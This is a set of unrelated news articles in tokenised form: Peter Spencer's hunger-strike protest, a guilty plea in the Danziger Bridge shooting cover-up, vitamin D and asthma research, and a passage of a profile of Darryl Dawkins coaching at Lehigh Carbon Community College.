The issue provoked a public split between the Coalition partners , with Liberal senator Bill Heffernan describing Mr Spencer 's protest as " barbaric " and urging that he be pulled down .
But as Graham Spencer called for his brother to end his 47 - day hunger strike , saying his family 's overriding concern was for his health , fresh information emerged about the NSW farmer 's past , including an armed stand - off with police 40 years ago .
The Australian understands the incident occurred in August 1970 following the breakdown of Mr Spencer 's first marriage and was an attempt to " get some attention " .
Mr Spencer reportedly suffered a minor bullet wound to his chest , believed to be self - inflicted .
Graham Spencer said yesterday his family was deeply concerned for Mr Spencer , who claims to be subsisting on water , lemon juice , vitamins and pain killers .
He said while Australia 's Kyoto obligations and legislation such as the Native Vegetation Act had restricted his brother 's use of the land , they were not his only problems .
" It 's something that 's come up after the trouble started , " Graham Spencer told The Australian .
Mr Spencer is protesting at restrictions on land clearing , imposed as greenhouse gas abatement measures .
He has vowed to maintain his protest until the Government agrees to hold a royal commission .
Graham Spencer said his brother owed " more than a million dollars " to a family member after being given a loan to prevent the bank seizing his farm .
" Peter does n't owe money to the bank , but to the family , " Graham Spencer said .
" One of the family members lent him the money , and I think the arrangement was he would make the interest payments . "
Graham Spencer said the family had made numerous attempts to accommodate Peter Spencer 's failure to pay the debt , which had been outstanding for some years .
But in October the family had been forced to seek a writ of possession that could force the sale of the property .
" It 's nothing to do with the banks - it 's a straight family dispute , and that 's where it should stay .
Let the family sort this out , " Graham Spencer said .

Enlarge By Cheryl Gerber , AP Dr. Romell Madison , left , Lance Madison and Jackie Madison Brown talk to attorney Mary Howell in New Orleans on Wednesday after Michael Lohman pleaded guilty to conspiring with fellow NOPD officers to obstruct justice by covering up a police - involved shooting that killed their brother , Ronald Madison , during the aftermath of Hurricane Katrina in 2005 .
NEW ORLEANS  A retired New Orleans police lieutenant pleaded guilty Wednesday to conspiring to cover up a deadly police - involved shooting in the aftermath of Hurricane Katrina in 2005 .
The plea in U.S. District Court by Michael Lohman , 42 , is part of an investigation by federal agents into several police shootings of civilians in the chaotic days immediately following Katrina .
Lohman faces up to five years in prison at his sentencing May 26 .
Seven officers were charged with murder or attempted murder in the Sept. 4 , 2005 , shootings , six days after Katrina made landfall and then battered the region .
The charges were later dismissed .
The incident happened when a group of police and other law enforcement officers in a large Budget rental truck confronted six people crossing the Danziger Bridge in eastern New Orleans , according to a police report .
REPORT : No crime wave among Hurricane Katrina evacuees Police fired at several of the people , killing Ronald Madison , a 40 - year - old mentally disabled man , and James Brissette , 19 , the report said .
The officers claimed they were fired at first , although surviving witnesses dispute that claim and say police opened fire on unarmed people .
According to federal documents unsealed Wednesday , Lohman arrived after the shooting and encouraged the supervising officers to falsify their stories to " make it appear as if the civilians who were shot on the bridge had shot first at officers . "
He also approved the planting of a gun at the scene to justify the shootings , according to the documents .
On Sunday , survivors of the Danziger Bridge incident , their families and lawyers applauded the guilty plea and said they hoped more will follow .
" The fact that you have an officer who supervised these officers admitting he conspired to cover up — it does n't get much better than that for vindication , " said Gary Bizal , attorney for Jose Holmes , who was shot several times in the stomach during the shooting .
Holmes was initially charged with shooting at officers but those charges were later dropped , Bizal said .
The case is part of a wider probe that could bring more convictions , according to prosecutors .
The FBI has confirmed its investigators are looking into at least three separate incidents where police shot eight people , killing four of them and badly injuring several others .
Over the past 1 ½ years , federal investigators have summoned dozens of New Orleans police officers to testify before federal grand juries and seized police records .
Jim Letten , U.S. Attorney for eastern Louisiana , said Lohman is expected to cooperate with investigators and federal agents will continue with all the investigations .
" We will forge ahead , " he said .
" Our evidence is strong . "
Federal investigators also are looking into the shooting death of Henry Glover , whose remains were found inside an abandoned , incinerated car in Algiers , La. , and Matthew McDonald , a drifter from Connecticut who was shot and killed by police in the Faubourg Marigny neighborhood of New Orleans five days after the storm , the FBI said .

Study : Vitamin D may benefit asthmatics
Category : Vitamin D Deficiency - Diagnosis and Treatment
The benefits of maintaining high levels of vitamin D in the body have long been touted - it improves immunity , stabilizes the nervous system and decreases the risk of developing high blood pressure .
But recent clinical tests reveal that that the sunshine vitamin may also play a role in the lung function of asthmatics .
According to a study published in the January 28 online edition of the American Journal of Respiratory and Critical Care Medicine , asthmatics with higher levels of vitamin D respond better to treatments than their counterparts with low vitamin D levels , Health Day reports .
A team of researchers at National Jewish Health in Denver measured the vitamin D levels of 54 asthmatics and assessed their lung function , airway hyper - responsiveness and reaction to a steroid treatment .
Blood tests found that asthmatics with levels of the nutrient below 30 nongrams per milliliter had an airway hyper - responsiveness that was almost double the reading of patients with more than 30 ng / ml .
Lower levels of vitamin D were also linked to a worse response to steroid therapy and a higher production of the allergen TNF - alpha , leading researchers to believe the sunshine vitamin could play a role in controlling inflammation in the lungs , according to the news source .
Dr Michael Holick , director of the Vitamin D , Skin and Bone Research Laboratory at the Boston University School of Medicine , told the news provider , " It 's pretty clear that you need a minimum of 1,400 and up to 2,000 international units a day [ of vitamin D ] , and if your are obese , you probably need at least one and a half to two times as much because of the fat sequesters in the vitamin . "
He added , " We now recognize that you can take up to 10,000 IUs a day and not worry about any untoward toxicity . "
As for asthmatics , the study 's lead researcher Dr E. Rand Sutherland commented to Health Day that " there is a potential that restoring normal vitamin D levels in people with asthma may help improve their asthma . "
Whether vitamin D supplements will help asthmatics is not yet known , added Sutherland
Controlling Asthma
While scientists work on establishing the link between asthma and vitamin D , and attempt to develop other preventive measures for controlling the condition , a team of researchers at the University of Cincinnati are working to uncover the causes of allergies and asthma .
According to a study published in the December issue of the American Journal of Respiratory and Critical Care Medicine , about 36 percent of 3 - year - olds who were exposed to high levels of traffic pollution and indoor endotoxin as infants experienced persistent wheezing later in life .
" There is a clear synergistic effect from co-exposure to traffic - related particles and endotoxin above and beyond what you would see with a single exposure that can be connected to persistent wheezing by age 3 , " said the study 's lead author Patrick Ryan , an assistant professor of environmental health at the university .
The scientists caution that wheezing is an early warning sign of asthma .
Emerging diagnostic testing
Should an individual recognize warning signs of asthma in themselves or a loved one , a new test may help them quickly diagnose the condition .
According to researchers at the Ohio State University Medical Center , the eucapnic voluntary hyperventilation test , which has regularly been used to diagnose athletes with exercise - induced asthma , is also applicable for the general public .
They commented that the test is useful for early diagnoses so that doctors may quickly provide " personalized therapeutic treatment " for patients .
According to the American Academy of Allergy Asthma & Immunology , about 34.1 million Americans have been diagnosed with asthma by a health professional during their lives .

OTL : Old College Try
Editor 's Note :
This story was originally published on February 9 , 2010 .
CHNECKSVILLE , Pa. --
The rim and Darryl Dawkins used to have a relationship .
They would meet at night , in crowded gyms across America , and each time , young , crass , muscle - bound Dawkins would beg the rim to go home with him .
He 'd taunt it , attack it and swing on it , but the rim always had the last laugh -- until the 1979 night in Kansas City when he tore a backboard to a thousand pieces .
The closest witness , Bill Robinzine ( God rest his soul ) , had to have his head checked for glass .
Dawkins ' 76ers teammate Steve Mix rushed to the locker room , dug out a camera and snapped pictures .
Their coach , Billy Cunningham , bitched and moaned about the 90 - minute delay .
Dawkins , thrilled to see the rim fractured on the floor , did what he does best :
He gave his slam a formal name .
If You Ain't Groovin ' Best Get Movin ' -- Chocolate Thunder Flyin ' -- Robinzine Cryin ' -- Teeth Shakin ' -- Glass Breakin' -- Rump Roastin ' -- Bun Toastin ' -- Glass Still Flyin ' -- Wham Bam I Am Jam !
It was a night the earth moved , just a little , and the NBA was never the same .
The league ushered in breakaway rims later that season , and hanging on to the basket became taboo and / or a technical foul .
It was the Dawkins Rule -- he would live in infamy now -- and young Darryl celebrated the moment by crowning himself " The Master of Disaster . "
But time moves on , ruthlessly , and 30 - odd years later , 53 - year - old Darryl Dawkins is standing in an obscure Pennsylvania gym , glaring at a basket , thinking the strangest , damnedest thing :
I 'm not sure I can dunk .
The man from Lovetron
You evolve .
Your body and mind change .
A lot of players , coaches and writers made predictions about " Chocolate Thunder , " about how his life would turn out -- and it 's crazy how many were dead wrong .
They thought he'd never wipe that impish grin off his face .
They thought he'd never get rid of his harem .
They thought he'd never stop rhyming .
They thought he'd make his name off Bill Robinzine forever .
But the hell with them -- he 's nothing like they remember .
In fact , they 'll never believe what 's in Darryl Dawkins ' pocket as he 's staring up at that Pennsylvania rim : a whistle .
It must be difficult to be stereotyped from the age of 14 , to be serially labeled a Baby Huey , a man-child , the next Wilt , a coach - killer , a cutup , a bust .
You can laugh or cry about it , but for the longest time , Dawkins chose denial and moved into an imaginary world .
He called it Planet Lovetron , a place where critics , coaches and refs were not permitted .
He invented this planet in high school , brought it with him to the pros , and Lovetron was how he got through the scrutiny and ridicule .
Nike A Nike poster of Darryl Dawkins as " Chocolate Thunder . "
In other words , it was all a show , an act .
The Philadelphia 76ers took him fifth overall in 1975 -- the first high school player to be drafted and go directly to the NBA , a year after Moses Malone made the same jump to the ABA -- and he signed his contract wearing a cream suit , a top hat and a bow tie .
By training camp , his hair was greased back , a la James Brown , and his dress suits were fire - engine red and Chiquita - banana yellow and even fuchsia .
The veterans considered him a nut job -- better that than have them think he was scared -- but the team 's second - round pick , Lloyd B .
Free out of Brooklyn , was dying to know more .
" I said , ' Darryl , what 's all that stuff in your hair ? ' "
Free remembers .
" And he said , ' No , I 'm cool , I 'm cool , I 'm from Lovetron . '
So I wondered where that place was .
I said , ' Darryl , we 're going to a party ; you want to go ? '
He said , ' Yeah , bro , let 's go , let 's do this thing . '
I said , ' Yo , I 'm going to come get you in three hours , ' and he had on a lime green outfit .
Looked like a big leprechaun .
I 'm like , ' Wait a minute , Darryl , I 'm not going to the club with you looking like that , ' and Darryl said , ' No , I 'm cool . '
And he had on green shoes !
I could n't believe it .
If you turned the lights out , you 'd still see Darryl walking around . "
Dawkins was 18 at the time , and this was back when 18 was really 18 -- no YouTube or Internet or 256 TV channels .
He was 6 - foot - 11 , 255 pounds and naive , and when he saw veterans such as George McGinnis smoking cigarettes at halftime , he figured it was OK to walk over and grab a beer .
They wagged a finger at him , so he just wagged one back .
He always carried a gigantic boom box on his shoulder -- on the bus , to the team hotels -- and woke up one morning with a sore rotator cuff .
He thought he had tweaked it in practice , so he went to see a doctor .
" Doc , my shoulder hurts . "
" Is that your radio , Darryl ? "
" Yes . "
" How much does it weigh ? "
" Seventy pounds . "
" There 's your problem . "
He barely played as a rookie because his coach , Gene Shue , did n't trust him .
How could he ?
Dawkins was eating chocolate bars on the bench .
If his coaches thought he was a fool or uncouth , it was because they knew nothing about him .
They did n't know that , growing up in Orlando , Fla. , he had n't had indoor plumbing until he was in middle school .
They did n't know he turned pro to buy homes for his mother and grandmother .
They did n't know he was planning to send all seven of his brothers and sisters to college .
They did n't know that after a Sixers home game , he saw a disheveled kid standing in the rain and drove the kid home to the slums .
They did n't know that after the next game the same kid showed up and invited him back to the slums for dinner .
They did n't know Darryl Dawkins had heart -- and , problem was , Dawkins did n't either .
Disenchanted , undereducated and self - destructive
The players and coaches would talk among themselves :
If only he'd gone to college
The kid , at 19 , already was maybe the strongest player in the league , and they 'd dream of the possibilities .
They would see him hold the ball like a grapefruit , drain a 15 - footer and run the floor in four steps , and they 'd expect him to abuse Wes Unseld , Bob Lanier and Kareem Abdul - Jabbar .
But he could n't -- he was n't technically sound -- and they all wondered what he would have looked like if he had gone to Kentucky like he was supposed to .
Dawkins heard the whispers , and they pissed him off .
By his second season , he was the Sixers ' backup center , averaging five points a game , and he was sick of being bashed .
His peers around the league knew he was a beast , and in one particular game in Denver , he dunked the ball with such force that the net whipped , knotted and sent the ball spinning back out of the basket .
While the refs were deciding whether the bucket should count -- which it did -- Nuggets forward Bobby Jones smelled smoke .
AP Photo Dawkins shattered his first backboard on Nov. 13 , 1979 , in a game against the Kansas City Kings , as players including Bill Robinzine , Scott Wedman and Julius Erving watched or were showered with glass .
" This is the truth -- I 'm smelling smoke , " Jones says .
" I 'm smelling something burning .
The nets were n't on fire or anything , but as I looked up there , because of the friction his dunk had caused , I could see these tiny little silk strands sort of drifting through the air .
I thought , ' Boy , I 'd like to have a guy like that watching my back . ' "
That same season , 1977 , the Sixers reached the NBA Finals against Portland and were cruising to a second straight victory in Game 2 when Dawkins and forward Bobby Gross exchanged words .
There was some clenching , and Dawkins sucker - punched Gross , starting a melee .
Portland enforcer Maurice Lucas went charging at Dawkins from behind , and when Sixers rookie guard Mike Dunleavy rose to help his teammate , guard Henry Bibby said , " Where you going , rook ? "
" They 're about to fight , " Dunleavy said .
" We do n't go anywhere until he gets involved , " Bibby said , pointing to the team 's uber - star , Julius Erving , who was standing like a statue at midcourt .
As a result , Dawkins was blindsided by Lucas , and when he was tossed from the game and banished to the locker room , he tore a toilet out of the wall .
He felt none of his teammates had had his back , so he dislodged a 7 - foot wood - paneled locker stall and barricaded the door .
" We could n't get in , " Dunleavy says .
" We had to ask him to open up . "
The Sixers lost the next four games , and everyone under the sun said the brawl changed the series .
Dawkins got much of the blame -- along with Shue , who could n't solve the Blazers ' backdoor cuts -- and it cemented a leaguewide perception that the kid was too infantile to count on .
Shue was replaced a full season later by Cunningham , and Dawkins entered camp fat and disinterested .
Screw everyone , he thought .
Billy C's rule was that every player had to run a six - minute mile before the first practice , and that first day , Dawkins ended up clomping in with a time of 15 minutes .
Cunningham ordered him to keep running the mile every day until he could trim his time to six flat , and on the second morning , assistant coach Jack McMahon took Dawkins back out to the track .
" They came back in a few minutes later , and Jack said he made it , " former teammate Mix says .
" But we all knew he did n't . "
Cunningham kept hounding Dawkins , kept making him run suicides , and during a practice , he blew his top at him for loafing .
He told him he needed to be serious , and Dawkins said , " Yep , coach . "
He told him he needed to hustle , and he said , " Yep , coach . "
And as Billy C walked away , Dawkins tripped him .
" And he 's laughing his tail off , " Cunningham says .
" I just looked at him and said , ' I give up . '
And you had to laugh yourself .
I mean , here 's this big kid laughing .
It was hard to be mad at Darryl Dawkins .
I mean , he would drive you crazy , but then he was a little boy inside .
A little boy . "
His first three years under Cunningham , Dawkins averaged 11 points and 8 rebounds , 13 and 8 , and 15 and 9 .
He played major minutes off the bench .
One game , he went off for 30 and 15 , but when owner Harold Katz said , " Good game , " Dawkins said , " I hope you do n't expect me to do it every night . "
He felt Katz was disingenuous with players , which was part of it , but the other part was he did n't want to be Chamberlain .
" He could 've been the next colossus of pros , " former 76er Fred Carter says , " and there 's only been one colossus of pros , and that 's Wilt .
But Darryl did not want that pressure to dominate every night .
See , he had no expectations of himself .
He was having fun .
Because again , it 's not his fault -- he did not go to college .
" He missed those years of college -- those teaching years , those dreaming years .
Dreaming about being something special .
Coming out of high school , you can't quite dream it .
College helps you because you learn to grow .
You learn to govern yourself , the dos and don'ts .
You learn to put yourself to bed at a certain time .
You learn what to say and what not to say .
Do n't get me wrong , Darryl was a lot sharper than what people realized .
But , unfortunately for Darryl , he had to learn on the fly . "
AP Photo Remnants of one of Dawkins ' broken glass backboards .
Instead of working on his deficiencies , he just kept dunking harder and harder , kept joking more and more .
He kept retreating to Lovetron , and the idea was to distract everyone .
He drove a Corvette that was painted so many colors Dunleavy said it looked like a meteorite .
" Either that , or it looked like someone puked all over it , " Free says .
Dawkins also wrote a rap saying he was " bad as I want to be " -- 20 years before Dennis Rodman -- and , in ' 79 , he became a household name when he shattered that Kansas City backboard .
Now , it was official : He was a sideshow .
He did n't need to play inspired , fundamental basketball to be famous .
Three weeks later , against the Spurs in Philadelphia , he demolished another backboard , just to see whether he could do it again .
And , as the public waited with bated breath , he named this dunk :
The Chocolate Thunder Ain't Playin -- Get Out Of The Wayin ' -- Backboard Swayin ' -- Game Delayin' -- Super Spike !
All Billy C knew was that the Sixers lost both backboard games , and -- even though the team had become the biggest draw in the NBA -- he and the league office gave Dawkins a scolding .
" I was uncoachable , " Dawkins confesses now .
" I should have been sent to Cleveland because that is where all the uncoachables went at the time . "
As the '70s morphed into the ' 80s , the Sixers continued to tolerate him , largely because they were on the brink of a title and he had a way of kneeing Lakers star Abdul - Jabbar in the kidneys .
In fact , Philly faced off against Abdul - Jabbar and a rookie named Magic Johnson in the 1980 Finals , and as usual , Chocolate Thunder created mischief .
Cunningham says he took a call , midseries , from a sneaker executive who said Dawkins was wearing a Nike shoe on one foot and a Pony shoe on the other .
He had signed deals with both -- because there were n't any noncompete clauses back then -- and Cunningham told the exec there was nothing he could do .
The series eventually was locked at 2 - 2 when Abdul - Jabbar severely twisted his ankle in the Lakers ' Game 5 victory .
Even though the Sixers now were down a game , L.A. would have no one to deal with Dawkins for the rest of the series , giving Philly a clear edge .
Abdul - Jabbar did n't even make the trip east for Game 6 , and when Magic ambled out to jump center , the Philly fans expected a runaway .
But Magic went for 42 points , 15 rebounds and 7 assists in L.A. 's title - clinching win , and the common perception was that he had embarrassed Dawkins .
Of course , Dawkins had barely guarded him ; Johnson had done most of his damage in transition or outside .
But , again , the fingers were pointed Dawkins ' way .
If only he'd gone to college
At least the Sixers ' players had his back now .
They knew Dawkins , deep down , was smarter and more team - oriented than the rest of the basketball world realized .
In fact , they thought he was brilliant , always so quick - witted .
Bobby Jones , by then a teammate , remembers an early morning wake - up call , when the team was walking trancelike to the bus at 5 a.m.
Trainer Al Domenico was wearing a checkered jacket no one had seen before , and Dawkins piped up , " Rook 3 to Pawn 4 checkmate . "
He was too good .
Something was in him , something generous , something hopeful .
When his buddy Lloyd B. Free -- an eccentric himself who later would change his name to World B. Free -- needed a place to stay as a rookie , Dawkins rented a cot and planted Free in his living room .
When Free suffered a collapsed lung during the ' 77 playoffs , Dawkins scooped him up and carried him off the court like a 6 - month - old .
When Bill Robinzine , of shattered backboard fame , committed suicide , Dawkins felt guilty for dunking on him .
In one of Dawkins ' final years in Philly , Cunningham mailed Mother 's Day cards to all the players ' moms , and a week later , the coach received a warm , appreciative reply from Harriette Dawkins -- " the most beautiful note I got back . "
He could n't coach him , but Billy C liked Dawkins .
He saved the note .
He thought to himself , " Darryl has good genes .
He 's got a chance .
A chance . "

Loved kids , hated refs
Cunningham hit the nail on the head : Harriette and Darryl 's grandmother , Amanda Jones , must have done something right .
When Darryl was a teenager in Orlando , he had a job picking oranges , earning $ 20 a week , and he siphoned the money to two places .
Half of it went to his mother to help pay the phone bill , and of his remaining 10 bucks , $ 4 went to kids in the neighborhood so they could buy ice cream .
Darryl soon was the king of that neighborhood and a bevy of others .
Later , because of the broken backboards and his raps , he'd be mobbed everywhere by kids who would beg him to rhyme .
And as an NBA player , he ended up working as many as 85 basketball camps a summer .
Rob Glazer Kids loved Dawkins , often asking him to rhyme for them .
He and his brother Chico would drive to the Poconos and Connecticut to work with the children -- he trusted them more than adults -- and when the 76ers traded him to the New Jersey Nets in August 1982 for a first - round pick ( used on Leo Rautins ) , he started the Darryl Dawkins Basketball Camp .
Almost every little kid had the same request :
Pick me up so I can dunk .
And Free swears that 's why Dawkins always looked so ripped -- from picking up 100 kids , one by one by one .
" Sometimes you do n't want people to know that side of you , " Dawkins says .
" You want people to know you for the guy you are on TV .
They see you knocking a couple guys around on the court , and they say , ' Oh , he 's mean , look at his face ; look how he 's sweating on the foul line . '
I wanted them to think of me as that guy . "
In other words , he was a faux bad boy -- intent on being insufferably macho -- and his battles with referees only reinforced his image as a screwup .
As soon as his minutes went up in New Jersey , so did the foul calls , and Dawkins purposely never censored himself .
He felt he was too manly to take a charge -- preferring to stay on his feet and let players bounce off him -- and after almost every whistle , he 'd say , " Yo mama , " which pretty much disintegrated his relationship with the refs .
By the 1983 - 84 season , he could sneeze on a guy and the officials would call a foul on him .
" I 'm not kidding , " Free says .
" Darryl was so big , he could go up to block your shot , and the actual wind from him swinging down would knock a guy over .
They 'd see a guy come out of the lane like he'd been shot out of cannon , and the refs would just figure , ' Darryl . ' "
By season 's end , he had set the NBA record for fouls ( 386 , or 4.7 a game ) , a record that still stands .
Carter and Dunleavy say if he'd gone to college -- and learned how to respect authority , or how to flop or scream out on contact and get to the free throw line -- he would have been an All - Star .
As it was , he averaged a career - high 16.8 points per game that season , so imagine his numbers if he had n't been forced to wither away on the bench in foul trouble .
After he averaged 15.3 points in ' 85 - 86 , his back went bad and he needed two disk surgeries , which was the beginning of the end .
He lost much of his explosiveness and played a total of only 12 games over the next three seasons , as he was peddled from New Jersey to Utah to Detroit .
He probably had more NBA games left in him , but he was so high maintenance that general managers did n't want him if he was going to be only a 10th or 11th man .
He was out of the league by 1989 , his legacy a confounding one .
He never became Wilt , but he was as popular as any All - Star , and he finished his 14 seasons with a .572 shooting percentage , fifth - best all time .
He showed NBA execs it was feasible for a high school kid to go pro , setting the stage for Kevin Garnett , Kobe and LeBron .
According to Dunleavy , he was a mini Shaq .
But all of that did n't alter the perception of him -- fair or unfair -- as an underachiever , and he was forced to conclude his career overseas , out of the spotlight .
He spent five seasons in Italy , then a year with the Globetrotters , which appealed to him because of the yuks and the kids .
He'd be introduced with " From the Planet Lovetron Darryl Dawkins ! "
He conducted children 's clinics all over the world .
But , eventually , he returned to the States in the late '90s , lonely and thinking of trying something new : coaching .
When he heard the news , Billy C fell down laughing .
Three marriages before he finally got it right
His mantra , as soon as he found his first coaching job , was :
Do like I say , not what I did .
He had played for every kind of coach -- Shue stressed offense , Cunningham stressed defense , Larry Brown just stressed -- and knew what to use and what to throw away .
He knew , from personal experience , how to yell at the refs .
He 'd played with one of greatest offensive players of all time ( Dr. J ) and one of the greatest defensive players of all time ( Bobby Jones ) .
He had a remarkable résumé .
Of course , despite this , nobody in the States would hire him .
So he coached in Canada .
In April 1999 , he led the Winnipeg Cyclone of the International Basketball Association to a 22 - 12 record and a playoff berth , and he was on his way .
He was mentoring 22 - year - old wannabes and 29 - year - old has - beens , and although the work was rewarding , he was still lonely , still missing something .
He 'd been married three times , but none of the relationships had stuck .
He had fathered a daughter , Dara , with his first wife , Penny , but this was early in his NBA career when monogamy was not in his vocabulary , and they eventually had the marriage annulled .
His second marriage , to Kelly Barnes , lasted longer , but while they were estranged in 1987 , Barnes overdosed on prescription medication and died .
Her death left him inconsolable -- he says he lay around for nine months getting fat , living off deferred payments from the Nets -- before he ended up leaping into another marriage , in 1988 , with a former Nets cheerleader , Robbin Thornton .
That relationship ended in divorce 10 years later while he was in Winnipeg , and it was good ol ' basketball that came to his mini rescue .
He landed a new coaching job at the tail end of 1999 with the Pennsylvania ValleyDawgs of the United States Basketball League , who played their games in Allentown during the summer .
No one from the 76ers could have ever imagined Chocolate Thunder bunkered down in small - town America , but something about the place appealed to him -- especially after he met a woman named Janice Hoderman at a trade show in April 2000 .
She was bubbly , warm and the single parent of a 4 - year - old child with Down syndrome .
At the time , little Tabitha was barely 2 feet tall , and Janice was raising her with the help of her parents after giving birth to her in high school .
Dawkins invited them to his ValleyDawgs games that summer , and although he and Tabitha had not been formally introduced , he'd wink at Tabitha in the stands , make goofy faces , the same corkscrew faces he used to make at Cunningham .
He asked Janice whether he could say hello to her daughter , but Tabitha was her entire world , and she was not going to let Dawkins meet her until she trusted he was in the relationship for the long haul .
She knew he was fabulous with kids , but she still made him wait six months .
" I was n't going to introduce him and then have it not work out between us , " Janice says .
" It would n't have been fair to her . "
When he and Tabitha finally formally met , they were instant buddies .
After Dawkins and Janice married in 2001 -- " My final wife , finally got it right , " he says -- little Tabitha would sneak into their bed at night to snuggle with him .
Janice wanted to cry .
Dawkins was comfortable with this ; he had coached special - needs kids with the Nets , and his daughter Dara had a significant hearing impairment .
And it was n't long until Tabitha had him wrapped around her finger .
She likes ketchup on all her food , so she 'd ask him to get the bottle and pour the ketchup for her .
He 'd rush to do it , of course .
She 'd then say she needed him to put the portable straw in her juice box .
He 'd rush to do that , as well .
Janice walked in on them one day and told him , " Please stop waiting on her hand and foot .
She can do all these things .
She 's conning you . "
He smirked a little smirk and wagged his finger at Tabitha .
And from then on , he let her pour her own ketchup .
Darryl Dawkins was getting coachable .
The world 's biggest househusband
Nine years later , Darryl Dawkins was a family man , an absolute homebody .
Nine years later , he and Janice were the parents of a 7 - year - old son , Nicholas , and a 6 - year - old daughter , Alexis -- not to mention a flourishing 14 - year - old Tabitha .
Nathaniel S. Butler / NBAE / Getty Images Dawkins with a group of children at a Special Olympics Clinic during the 2009 NBA Europe Live on Oct. 3 , 2009 , in London .
He 'd coached the ValleyDawgs to two USBL titles , in 2001 and 2004 , and when the team folded in 2005 , he was recruited to do nonprofit work for the NBA .
With the Nets , he had always signed autographs until his wrist fell off , so the league asked him to be an " ambassador , " doing what he does best : shaking hands , hamming it up , saying , " Yo mama . "
He could n't have been more domesticated .
Every morning , it was his job to get Tabitha out the door for school .
Janice could never rouse her , but he knew all the tricks .
He 'd say , " I 'm goooooing to geeeet youuuu , " and Tabitha would swing into motion .
After that , their routine was priceless .
Tabitha had a habit of secretly taking Janice 's necklaces and earrings to school , or bringing in family photos or a radio .
" If Tabitha could pack up her whole bedroom and take it to school , she 'd do it , " Janice says .
So it was Darryl 's assignment , each morning , to check her pockets .
He 'd turn this into a game .
He 'd pat her down , then she 'd pat him down .
She 'd say , " Stick 'em up . "
Then he'd take Tabitha to the bus stop .
He also was heavily involved in her Special Olympics events , in which she was something of a prodigy -- 120 medals in soccer and swimming .
When Dawkins would show up at her events , she 'd come running up to him shouting , " Daddy ! "
" You should see people 's faces , " Janice says .
" I mean , who 's going to believe a little white Down syndrome kid who says Darryl Dawkins is her daddy . "
He still would talk periodically with World B. Free and Bobby Jones , and they both were overwhelmed by how this little girl had changed their old friend 's life .
" Tabitha does not need anyone to have pity on her , " Dawkins says .
" If you show her love and you be who you are , she can accept that .
And through that , it 's helped me to mature and grow also . "
By 2009 , he seemed to have everything -- except basketball .
He 'd help a local AAU team and conduct an occasional clinic , but he did n't have a daily hoops fix .
And then , this past summer , while Janice was scanning a careers
Web site , she saw a want ad for a basketball coach .
At a college .
And introducing the head coach of L - Tri- C Mr. Chocolate Thunder
The phone rang at Lehigh Carbon Community College , in the Allentown suburb of Schnecksville , Pa. , and athletic director Jocelyn Beck picked up .
" Hi , this is Darryl Dawkins .
I 'm interested in being your basketball coach . "
" Who is this ? "
" Darryl Dawkins . "
" OK , just send me your résumé . "
" What do you mean ? "
" I need to have a résumé .
Thank you . "
Beck honestly thought it was a crank phone call , a joke , which was why she rushed him off the line in 14 seconds .
Beck , the former women 's coach at Lehigh University , was a longtime Sixers fan who remembered Dawkins busting those backboards .
To her , he was a legend .
Why would he want to coach at L - Tri-C ?
How did he even know about L - Tri-C ?

She told her boss she might have just spoken to Chocolate Thunder , but her boss did n't believe her .
" Nobody on campus believed me , " she says .
Two days later , the résumé arrived .
Janice had typed the thing up , and Dawkins ' references were n't Billy C or Dr. J ; they were local Allentown business leaders .
Beck phoned one of the men , who said : " Darryl has only one fault that I can tell you about . "
Beck felt a panic attack coming on .
In her mind , she had already hired him .
" What 's the problem ? " she asked .
" His wardrobe .
It 's like Skittles .
He has a lime green suit . "
" I can deal with that , " she said .
Beck formed a committee and invited Dawkins in for an interview .
He barely fit through her door , and his first words were , " Hi , I 'm Darryl Dawkins . "
" I know . "
" So ask me anything . "
" OK .
First of all , why ?
Why do you want this job ? "
" Why not ? "
" You 're hired . "
They both burst out laughing , but then the questions grew serious .
She asked him what his goals were , and he told her he would stress school first , basketball second .
He told her education meant the world to him .
His daughter Dara already had earned a degree from Temple University .
He 'd sent five of his brothers and sisters to college .
He told Beck 's committee that he valued staying in school -- even though he'd never spent a day in college -- and that he wanted his players doing good deeds in the community .
He said at least he'd been to the college of hard knocks -- and that qualified him for the job .
She had to hire him ; it was a no - brainer .
The school offered him a salary similar to a high school coach 's -- " By the time he recruits and all that , he 's probably making 5 cents an hour , " Beck says -- and Dawkins jumped at it .
He then took a stroll around campus .
" So this is what college looks like , " he thought .
ESPN
Dawkins today , coaching and having dinner with his family .
Never try to con a con man
He scheduled a team tryout for the fall , and some of the kids who showed up did n't even go to L - Tri-C .
They had come to see Chocolate Thunder , and when he walked in , characteristically late , all 35 players stopped dribbling and just stared .
There was n't a sound .
After Beck chased out the impostors , Dawkins began to run the kids into the ground .
Billy C would 've been proud ; Dawkins , who used to eat 3 Musketeers bars on the bench , whose mile runs used to be timed on a sundial , had finally seen the light .
When the roster was posted a few days later , some of the players who had failed to make the team wept in the parking lot .
These were kids who did n't want to lose their dreaming years , and that was the reason Dawkins liked the job so much .
He could n't bear to see them cry .
So he told some of the kids who got cut that he probably would hold another tryout midseason .
Most of these players were born in the early 1990s ; they were 18 and 19 , the same age the coach had been in 1975 .
But , curiously , they knew his whole story .
They 'd YouTubed him .
They 'd watched his old Wheaties commercials ; they 'd seen the Robinzine dunk .
And if they were n't certain how legendary he was , imagine their faces when President Barack Obama visited L - Tri-C for a town meeting in December and bum - rushed their coach .
" Chocolate Thunder ! " Obama exclaimed .
" Yessir , Mr. President , " Dawkins responded .
At first , his players assumed they'd get to hear some of Dawkins ' raps , but they found out fairly early that was n't happening .
The team 's leading scorer from the previous season , Jake Waylen , finally mustered the courage to ask , " What 's up with Planet Lovetron ? "
But Dawkins ' reply was , " Maybe when you 're out of school , I 'll tell you . "
He was n't playing around .
He wanted the team to push the ball 100 miles an hour , and he figured now was n't the time to tell them tales of his boom box .
He 'd run them so hard , he 'd put trash receptacles all over the gym in case they lost their lunches .
He was a taskmaster .
Thirty - five years later , here he was in college , even threatening to take a class or two .
Lovetron was unnecessary now .
In the old days , Lovetron was his escape from reality ; now , he preferred reality .
" Lovetron is temporarily shut down for repairs , " he says .
" It may be shut down for the duration .
I 'm on the coaching planet right now . "
From the minute the season began in December , Beck kept waiting for a lime green suit that never arrived .
Dawkins harangued the refs , ran a tight ship and realized , when he looked at his starting center , that he had come full circle .
The kid 's name was Carlos Pujols , and he was a cutup , just like Dawkins used to be .
He hated to run , just like Dawkins , and he had some con in him , just like Dawkins .
" You got to box out , " the coach said one day .
" What ? "
" You got to box out , man . "
" What ? "
" You can't hear me ? "
" What ? "
Dawkins had made a career tuning out his coaches , so he knew what Pujols was doing .
" You can't pull anything over on me , " he said .
" I 've seen it all . "
They began to talk , daily .
Dawkins found out Pujols worked with at - risk kids after school , kids who'd been arrested for drugs , stealing cars or fighting .
